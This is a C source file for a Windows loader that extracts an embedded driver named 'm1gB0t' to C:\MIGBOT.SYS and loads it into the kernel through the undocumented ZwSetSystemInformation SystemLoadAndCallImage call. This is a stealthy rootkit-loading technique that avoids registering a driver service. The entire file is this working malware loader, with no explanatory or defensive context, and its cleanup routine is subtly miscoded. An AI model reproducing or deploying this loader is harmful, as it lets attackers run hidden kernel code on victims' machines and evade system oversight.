#include "stdafx.h"
#include <Windows.h>
#include  <Subauth.h>
typedef NTSTATUS(__stdcall *ZWSETSYSTEMINFORMATION)(DWORD SystemInformationClass, PVOID SystemInformation, ULONG SystemInformationLength);

typedef VOID(WINAPI  *RTLINITUNICODESTRING)(PUNICODE_STRING DestinationString, PCWSTR SourceString);

ZWSETSYSTEMINFORMATION ZwSetSystemInformation;
RTLINITUNICODESTRING RtlInitUnicodeString;

typedef struct _SYSTEM_LOAD_AND_CALL_IMAGE
{
	UNICODE_STRING ModuleName;
} SYSTEM_LOAD_AND_CALL_IMAGE, *PSYSTEM_LOAD_AND_CALL_IMAGE;

#define SystemLoadAndCallImage 38 
BOOL Decompress_Sysfile();
BOOL Load_Sysfile();
BOOL Cleanup();

void main()
{
	if (!Decompress_Sysfile())
	{
		printf("Failed to decompress m1gB0t\r\n");
	}
	else if (!Load_Sysfile())
	{
		printf("Failed to load m1gB0t\r\n");
	}

	if (!Cleanup())
	{
		printf("Cleanup failed\r\n");
	}
}
BOOL Decompress_Sysfile()
{
	HRSRC aResourceH;
	HGLOBAL aResourceHGlobal;
	unsigned char * aFilePtr;
	DWORD aFileSize;
	HANDLE File_handle;
	aResourceH = FindResource(NULL, L"MIGBOT", L"BINARY");
	if (!aResourceH)
	{
		return 0;
	}

	aResourceHGlobal = LoadResource(NULL, aResourceH);
	if (!aResourceHGlobal)
	{
		return 0;
	}

	aFileSize = SizeofResource(NULL, aResourceH);
	aFilePtr = (BYTE*)LockResource(aResourceHGlobal);
	if (!aFilePtr)
	{
		return 0;
	}

	File_handle = CreateFile(L"C:\\MIGBOT.SYS", FILE_ALL_ACCESS, 0, NULL, CREATE_ALWAYS, 0, NULL);

	if (INVALID_HANDLE_VALUE == File_handle)
	{
		return 0;
	}

	while (aFileSize--)
	{
		unsigned long numWritten;
		WriteFile(File_handle, aFilePtr, 1, &numWritten, NULL);
		aFilePtr++;
	}
	CloseHandle(File_handle);

	return 1;
}
BOOL Load_Sysfile()
{
	SYSTEM_LOAD_AND_CALL_IMAGE GregsImage;
	WCHAR daPath[] = L"\\??\\C:\\MIGBOT.SYS";
	if (!(RtlInitUnicodeString = (RTLINITUNICODESTRING)GetProcAddress(GetModuleHandle(L"ntdll.dll"), "RtlInitUnicodeString")))
	{
		return 0;
	}

	if (!(ZwSetSystemInformation = (ZWSETSYSTEMINFORMATION)GetProcAddress(GetModuleHandle(L"ntdll.dll"),"ZwSetSystemInformation")))
	{
		return 0;
	}

	RtlInitUnicodeString(&(GregsImage.ModuleName), daPath);

	if (!NT_SUCCESS(ZwSetSystemInformation(SystemLoadAndCallImage, &GregsImage,sizeof(SYSTEM_LOAD_AND_CALL_IMAGE))))
	{
		return 0;
	}

	return 1;
}
BOOL Cleanup()
{
#ifdef _delete_sysfile
	if (S_OK != DeleteFile("C:\\MIGBOT.SYS"))
	{
		return 0;
	}
#endif
	return 1;
}

